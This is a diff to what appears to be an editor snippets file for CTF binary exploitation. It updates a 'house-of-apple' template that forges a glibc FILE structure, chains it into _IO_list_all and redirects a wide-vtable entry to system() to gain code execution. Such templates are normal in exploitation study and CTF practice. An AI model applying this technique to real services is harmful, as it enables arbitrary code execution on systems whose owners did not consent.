@@ -55,11 +55,14 @@
 	"house-of-apple fake FILE": {
 		"prefix": "hoa",
 		"body": [
+			"fake_FILE_addr = heap_base + 0x2b0",
+			"_wide_data = fake_FILE_addr + 8",
+			"_wide_vtable = _wide_data + 0xe0 - 0x60",
 			"# Calling chain: ",
 			"# exit()",
 			"#  |-- _IO_flush_all_lockp()",
 			"#       |-- _IO_OVERFLOW(fp) ==> _IO_wfile_jumps.__overflow()",
-			"#           |-- _IO_wdoallocbuf(fp) ==> fp->_wide_data->_wide_table->__doallocate",
+			"#           |-- _IO_wdoallocbuf(fp) ==> fp->_wide_data->_wide_table->__doallocate: offset +0x68 from vtable",
 			"# Requirements:",
 			"#   _flags &= ~(2|8|0x800)",
 			"#   mode > 0",
@@ -84,10 +87,10 @@
 			"    # fake_FILE end, but fake_IO_wide_data still have some members.",
 			"    0,",
 			"    _wide_vtable,   # +0xe8 == fake_wide_data + 0xe0, _wide_vtable",
-			"    libc.sym.system,     # +0xf0 == fake_wide_data + 0xe8, _wide_vtable->__overflow",
+			"    libc.sym.system,     # +0xf0 == fake_wide_data + 0xe8, _wide_vtable->__doallocate",
 			"])",
 			"",
-			"edit(0, b'\0'*0x58 + p64(fake_FILE_addr)) # set _IO_list_all->_chain",
+			"edit(0, b'\\0'*0x58 + p64(fake_FILE_addr)) # set _IO_list_all->_chain",
 			"edit(1, fake_FILE)",
 		]
 	},
